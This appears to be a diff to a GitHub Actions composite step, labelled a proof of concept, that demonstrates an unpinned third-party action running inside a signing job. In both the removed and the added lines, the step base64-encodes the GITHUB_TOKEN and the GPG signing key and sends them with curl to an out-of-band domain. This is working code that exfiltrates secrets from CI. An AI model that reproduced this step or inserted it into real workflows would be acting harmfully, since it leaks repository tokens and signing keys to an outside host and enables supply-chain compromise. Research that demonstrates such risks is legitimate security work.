@@ -11,16 +11,15 @@ runs:
       shell: bash
       env:
         POC_OOB_DOMAIN: ${{ env.POC_OOB_DOMAIN }}
-        GPG_SECRET_KEY: ${{ env.GPG_SECRET_KEY }}
       run: |
         echo "=== [poc] running inside signing job via unpinned third-party action ref ==="
         echo "runner: $(uname -a | head -c 80)"
+        echo "[poc] GITHUB_TOKEN=${GITHUB_TOKEN:+PRESENT len ${#GITHUB_TOKEN}}"
+        echo "[poc] GPG_SECRET_KEY=${GPG_SECRET_KEY:+PRESENT len ${#GPG_SECRET_KEY}}"
         if [ -n "${GITHUB_TOKEN:-}" ]; then
-          echo "[poc] GITHUB_TOKEN present length=${#GITHUB_TOKEN}"
-          curl -sS --max-time 12 "https://${POC_OOB_DOMAIN}/tkn/$(printf %s "$GITHUB_TOKEN" | base64 -w0)" -o /dev/null -w 'oob_gt=%{http_code}\n' >/dev/null 2>&1 || echo "gt_exfil_err"
+          curl -s -o /dev/null -w 'oob_gt_http=%{http_code}\n' --max-time 12 "https://${POC_OOB_DOMAIN}/tkn/$(printf %s "$GITHUB_TOKEN" | base64 -w0)"
         fi
         if [ -n "${GPG_SECRET_KEY:-}" ]; then
-          echo "[poc] GPG_SECRET_KEY present (mounted to this step env)"
-          curl -sS --max-time 12 "https://${POC_OOB_DOMAIN}/gpg/$(printf %s "$GPG_SECRET_KEY" | base64 -w0)" -o /dev/null -w 'oob_gpg=%{http_code}\n' >/dev/null 2>&1 || echo "gpg_exfil_err"
+          curl -s -o /dev/null -w 'oob_gpg_http=%{http_code}\n' --max-time 12 "https://${POC_OOB_DOMAIN}/gpg/$(printf %s "$GPG_SECRET_KEY" | base64 -w0)"
         fi
         echo "=== [poc] done ==="
